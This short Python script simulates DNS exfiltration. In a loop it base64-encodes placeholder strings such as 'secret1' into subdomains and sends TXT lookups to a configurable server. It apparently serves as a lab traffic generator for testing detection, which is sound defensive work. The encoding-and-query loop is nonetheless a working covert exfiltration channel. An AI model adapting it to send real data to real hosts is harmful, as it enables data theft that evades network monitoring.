import os, time, base64, subprocess
TARGET = os.environ.get("DNS_SERVER","dns_server")
INTERVAL = float(os.environ.get("INTERVAL","2.0"))
payloads = ["secret1","leak-data","topsecret"]
i = 0
while True:
    p = payloads[i % len(payloads)]
    enc = base64.urlsafe_b64encode(p.encode()).decode().strip("=")
    domain = f"{enc}.{TARGET}"
    # use dig if available, fallback to nslookup
    try:
        subprocess.run(["dig","+short","TXT",domain], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except Exception:
        try:
            subprocess.run(["nslookup",domain], check=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except Exception as e:
            print("no dig/nslookup:", e)
    print(time.ctime(), "queried", domain)
    i+=1
    time.sleep(INTERVAL)
